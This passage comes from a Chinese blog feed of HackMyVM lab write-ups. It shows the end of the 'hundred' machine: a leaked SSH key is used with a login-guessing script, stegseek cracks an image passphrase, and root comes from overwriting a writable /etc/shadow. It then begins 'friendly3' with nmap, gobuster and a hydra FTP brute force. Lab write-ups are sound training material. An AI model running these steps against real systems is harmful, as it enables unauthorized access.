/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">26</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>啊，没有东西，字典有误？换个工具</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS E:<span class="token punctuation">\</span>我的工具包<span class="token punctuation">\</span>dirmap-master<span class="token operator">></span> python .<span class="token punctuation">\</span>dirmap.py <span class="token parameter variable">-i</span> http://192.168.56.190/softyhackb4el7dshelldredd/  <span class="token parameter variable">-lcf</span>

                     <span class="token comment">#####  # #####  #    #   ##   #####</span>
                     <span class="token comment">#    # # #    # ##  ##  #  #  #    #</span>
                     <span class="token comment">#    # # #    # # ## # #    # #    #</span>
                     <span class="token comment">#    # # #####  #    # ###### #####</span>
                     <span class="token comment">#    # # #   #  #    # #    # #</span>
                     <span class="token comment">#####  # #    # #    # #    # #   v1.0</span>

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Initialize targets<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Load targets from: http://192.168.56.190/softyhackb4el7dshelldredd/
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Set the number of thread: <span class="token number">30</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Coroutine mode
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Current target: http://192.168.56.190/softyhackb4el7dshelldredd/
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching auto check <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Checking with: http://192.168.56.190/softyhackb4el7dshelldredd/cntxgehdtdhihrowexxhyabyqbieuvdkjjvhyjxbse
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use recursive scan: No
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use dict mode
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Load dict:E:<span class="token punctuation">\</span>我的工具包<span class="token punctuation">\</span>dirmap-master<span class="token punctuation">\</span>data<span class="token punctuation">\</span>dict_mode_dict.txt
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Use crawl mode
<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">[</span>application/octet-stream<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span>.83kb<span class="token punctuation">]</span> http://192.168.56.190/softyhackb4el7dshelldredd/id_rsa
<span class="token punctuation">[</span><span class="token number">200</span><span class="token punctuation">]</span><span class="token punctuation">[</span>text/html<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">26</span>.00b<span class="token punctuation">]</span> http://192.168.56.190/softyhackb4el7dshelldredd/index.html
 <span class="token number">99</span>% <span class="token punctuation">(</span><span class="token number">5667</span> of <span class="token number">5715</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token comment">########################################################### | Elapsed Time: 0:00:07 ETA:   0:00:00</span></code></pre>
<p> 扫出来一个私钥,那基本就能连接了，利用之前拿到的users</p>
<h2 id="users爆破"><a href="#users爆破" class="headerlink" title="users爆破"></a>users爆破</h2> <pre class="language-bash" data-language="bash"><code class="language-bash"> <span class="token operator">></span> ./a.sh users.txt <span class="token number">192.168</span>.56.190 id_rsa
Trying noname@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: noname@192.168.56.190
Trying roelvb@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: roelvb@192.168.56.190
Trying ch4rm@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: ch4rm@192.168.56.190
Trying marcioapm@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: marcioapm@192.168.56.190
Trying isen@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: isen@192.168.56.190
Trying sys7em@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: sys7em@192.168.56.190
Trying chicko@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: chicko@192.168.56.190
Trying tasiyanci@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: tasiyanci@192.168.56.190
Trying luken@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: luken@192.168.56.190
Trying alienum@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: alienum@192.168.56.190
Trying linked@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: linked@192.168.56.190
Trying tatayoyo@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: tatayoyo@192.168.56.190
Trying 0xr0n1n@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: 0xr0n1n@192.168.56.190
Trying exploiter@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: exploiter@192.168.56.190
Trying kanek180@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: kanek180@192.168.56.190
Trying cromiphi@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: cromiphi@192.168.56.190
Trying softyhack@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: softyhack@192.168.56.190
Trying b4el7d@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: b4el7d@192.168.56.190
Trying val1d-@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: val1d-@192.168.56.190
Trying hmv@192.168.56.190 with key id_rsa
Host key verification failed.
Failed: hmv@192.168.56.190
No valid credentials found.</code></pre>
<p>不是哥们，都是错的,随便试了一个发现还需要密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> <span class="token number">123</span>  b4el7d@192.168.56.190
b4el7d@192.168.56.190's password:</code></pre>
<p>正跟群主聊天进度呢，突破口来了，想到之前那个目录还没用<br><img src="https://ooo.0x0.ooo/2024/06/23/OPzI9L.png" alt="OPzI9L.png" loading="lazy"><br>注意到上面还有个图片，不会藏小零食了吧<br>用给的users.txt跑一下隐写发现真有东西</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> stegseek logo.jpg                
StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Progress: <span class="token number">99.24</span>% <span class="token punctuation">(</span><span class="token number">132.4</span> MB<span class="token punctuation">)</span>           
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> error: Could not <span class="token function">find</span> a valid passphrase.

 ~/Desktop                                                                                                                                                                                                        5s  root@kali2  <span class="token number">20</span>:57:13 
<span class="token operator">></span> stegseek logo.jpg users.txt 
StegSeek <span class="token number">0.6</span> - https://github.com/RickdeJager/StegSeek

<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Found passphrase: <span class="token string">"cromiphi"</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Original filename: <span class="token string">"toyou.txt"</span><span class="token builtin class-name">.</span>
<span class="token punctuation">[</span>i<span class="token punctuation">]</span> Extracting to <span class="token string">"logo.jpg.out"</span><span class="token builtin class-name">.</span>


 ~/Desktop                                                                                                                                                                                                            root@kali2  <span class="token number">20</span>:57:45 
<span class="token operator">></span> <span class="token function">cat</span> logo.jpg.out 
d4t4s3c<span class="token comment">#1</span></code></pre>
<p>用私钥解析一下用户名</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> ssh-keygen <span class="token parameter variable">-y</span> <span class="token parameter variable">-f</span> <span class="token number">123</span>
Enter passphrase: 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDTAhcp/5nwlsy+3EWvxJUZ5ok0krnLNSETXK915aZ1G/r9DEYI00+A03XALv36P8/RMJMTb6O99TMumLsB18Al014yCEK+zhp0aIMeuIlqlhD0thxXINPGzLewoTZKSctZIRFeO9lNaxqLi4dVDgyBPwglvDzZldRYxTd6+/RpP+5dPggjoj4ZC5kln+SkD2+EPveTuJQAs/wLaeHgBDVuKUOHD/FA/Vctw1ZXYzYIL+vkGL8cMjiIlscCE4Ze+3QzHs9otOqPczDoZ5v1IAl0vJ7lKaLR27ovWnCOQdoS9BVojlEOtOzlyX1V9M1pkePhmzSTaIDMBXuLcYmaKa8L hmv@hundred</code></pre>
<p>拿到用户名是hmv</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">ssh</span> <span class="token parameter variable">-i</span> <span class="token number">123</span>  hmv@192.168.56.190
Enter passphrase <span class="token keyword">for</span> key <span class="token string">'123'</span><span class="token builtin class-name">:</span> 
Linux hundred <span class="token number">4.19</span>.0-16-amd64 <span class="token comment">#1 SMP Debian 4.19.181-1 (2021-03-19) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Jun <span class="token number">23</span> 09:11:12 <span class="token number">2024</span> from <span class="token number">192.168</span>.56.104
hmv@hundred:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hmv<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hmv<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>hmv<span class="token punctuation">)</span>,24<span class="token punctuation">(</span>cdrom<span class="token punctuation">)</span>,25<span class="token punctuation">(</span>floppy<span class="token punctuation">)</span>,29<span class="token punctuation">(</span>audio<span class="token punctuation">)</span>,30<span class="token punctuation">(</span>dip<span class="token punctuation">)</span>,44<span class="token punctuation">(</span>video<span class="token punctuation">)</span>,46<span class="token punctuation">(</span>plugdev<span class="token punctuation">)</span>,109<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>
hmv@hundred:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">40</span>
drwxr-xr-x <span class="token number">4</span> hmv  hmv  <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root root <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> hmv  hmv    <span class="token number">28</span> Jun <span class="token number">23</span> 09:02 .bash_history
-rw-r--r-- <span class="token number">1</span> hmv  hmv   <span class="token number">220</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hmv  hmv  <span class="token number">3526</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x <span class="token number">3</span> hmv  hmv  <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> .local
-rw-r--r-- <span class="token number">1</span> hmv  hmv   <span class="token number">807</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> .profile
drwx------ <span class="token number">2</span> hmv  hmv  <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> .ssh
-rw------- <span class="token number">1</span> hmv  hmv    <span class="token number">12</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> user.txt
-rw------- <span class="token number">1</span> hmv  hmv    <span class="token number">53</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> .Xauthority
hmv@hundred:~$ <span class="token function">cat</span> user.txt 
HMV100vmyay</code></pre>
<p>也算是拿到user权限</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hmv@hundred:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root root <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root root <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">4</span> hmv  hmv  <span class="token number">4096</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> hmv</code></pre>
<p>home下只有一个用户<br>sudo看一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hmv@hundred:/home$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
-bash: sudo: <span class="token builtin class-name">command</span> not found</code></pre>
<p>无<br>看一下suid</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hmv@hundred:/home$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-ls</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
     <span class="token number">3888</span>     <span class="token number">52</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">51280</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> /usr/bin/mount
     <span class="token number">3890</span>     <span class="token number">36</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">34888</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> /usr/bin/umount
       <span class="token number">59</span>     <span class="token number">56</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">54096</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/chfn
       <span class="token number">60</span>     <span class="token number">44</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">44528</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/chsh
     <span class="token number">3415</span>     <span class="token number">44</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">44440</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/newgrp
     <span class="token number">3562</span>     <span class="token number">64</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">63568</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> /usr/bin/su
       <span class="token number">62</span>     <span class="token number">84</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">84016</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/gpasswd
       <span class="token number">63</span>     <span class="token number">64</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">63736</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/passwd
   <span class="token number">135895</span>     <span class="token number">12</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">10232</span> Mar <span class="token number">28</span>  <span class="token number">2017</span> /usr/lib/eject/dmcrypt-get-device
    <span class="token number">15831</span>    <span class="token number">428</span> -rwsr-xr-x   <span class="token number">1</span> root     root       <span class="token number">436552</span> Jan <span class="token number">31</span>  <span class="token number">2020</span> /usr/lib/openssh/ssh-keysign
    <span class="token number">12491</span>     <span class="token number">52</span> -rwsr-xr--   <span class="token number">1</span> root     messagebus    <span class="token number">51184</span> Jul  <span class="token number">5</span>  <span class="token number">2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper</code></pre>
<p>无<br>看一下历史指令</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hmv@hundred:~$ <span class="token function">cat</span> .bash_history 
<span class="token builtin class-name">unset</span> HISFTILE
<span class="token function">su</span> root
<span class="token builtin class-name">exit</span></code></pre>
<p>无<br>传个linpeas分析发现 &#x2F;etc&#x2F;shadow可写</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╔══════════╣ Interesting writable files owned by me or writable by everyone <span class="token punctuation">(</span>not <span class="token keyword">in</span> Home<span class="token punctuation">)</span> <span class="token punctuation">(</span>max <span class="token number">500</span><span class="token punctuation">)</span>
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="token comment">#writable-files                                                                                                                                                           </span>
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/etc/shadow
/home/hmv
/run/lock
/run/user/1000
/run/user/1000/systemd
/srv/ftp/id_rsa
/srv/ftp/id_rsa.pem
/srv/ftp/id_rsa.pub
/srv/ftp/users.txt
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/tmp
/var/www/html/softyhackb4el7dshelldredd/id_rsa</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hmv@hundred:~$ <span class="token function">ls</span> <span class="token parameter variable">-l</span> /etc/shadow
-rwxrwx-wx <span class="token number">1</span> root shadow <span class="token number">963</span> Aug  <span class="token number">2</span>  <span class="token number">2021</span> /etc/shadow</code></pre>
<p>那就自己写个密码塞进去不久完事了<br>用openssl生成密码，我生成了一个密码<code>123456</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hmv@hundred:~$ openssl <span class="token function">passwd</span>
Password: 
Verifying - Password: 
vIYfhvUIgIXJ6
hmv@hundred:~$ <span class="token builtin class-name">echo</span> <span class="token string">'root:vIYfhvUIgIXJ6:19772:0:99999:7:::'</span> <span class="token operator">></span>/etc/shadow
hmv@hundred:~$ <span class="token function">su</span>
Password: 
root@hundred:/home/hmv<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>

]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>rsa</tag>
        <tag>/etc/shadow</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-friendly3</title>
    <url>/posts/1861442f/</url>
    <content><![CDATA[<p><strong>难度:easy</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.156</strong></p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.56.156 -sV -A </span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-04-20 <span class="token number">12</span>:20 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.156
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00067s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.3
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">9</span>.2p1 Debian <span class="token number">2</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">256</span> bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.22</span>.1
<span class="token operator">|</span>_http-server-header: nginx/1.22.1
<span class="token operator">|</span>_http-title: Welcome to nginx<span class="token operator">!</span>
MAC Address: 08:00:27:8E:DD:57 <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.67</span> ms <span class="token number">192.168</span>.56.156

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">11.36</span> seconds</code></pre>
<p>开放了 21 22 80 三个端口，不过这次21端口没有匿名登录</p>
<h2 id="web信息搜集"><a href="#web信息搜集" class="headerlink" title="web信息搜集"></a>web信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/04/20/OpUFvD.png" alt="OpUFvD.png" loading="lazy"></p>
<blockquote>
<p>Hi, sysadmin<br>I want you to know that I’ve just uploaded the new files into the FTP Server.<br>See you,<br>juan.</p>
</blockquote>
<p>juan把最新文件上传到了FTP服务，但是没有密码，扫一下目录看有什么信息</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># </span>
gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.56.156 <span class="token parameter variable">-x</span> html,txt,php,bak,zip <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Gobuster v3.6
by OJ Reeves <span class="token punctuation">(</span>@TheColonial<span class="token punctuation">)</span> <span class="token operator">&amp;</span> Christian Mehlmauer <span class="token punctuation">(</span>@firefart<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Url:                     http://192.168.56.156
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Method:                  GET
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Threads:                 <span class="token number">10</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Negative Status codes:   <span class="token number">404</span>
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> User Agent:              gobuster/3.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Extensions:              txt,php,bak,zip,html
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Timeout:                 10s
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Starting gobuster <span class="token keyword">in</span> directory enumeration mode
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html           <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">355</span><span class="token punctuation">]</span>
Progress: <span class="token number">1323360</span> / <span class="token number">1323366</span> <span class="token punctuation">(</span><span class="token number">100.00</span>%<span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
Finished
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span></code></pre>
<p>啥也没扫到，只能爆破一下ftp的密码</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.156  </span>
Hydra v9.5 <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2023</span> by van Hauser/THC <span class="token operator">&amp;</span> David Maciejak - Please <span class="token keyword">do</span> not use <span class="token keyword">in</span> military or secret <span class="token function">service</span> organizations, or <span class="token keyword">for</span> illegal purposes <span class="token punctuation">(</span>this is non-binding, these *** ignore laws and ethics anyway<span class="token punctuation">)</span>.

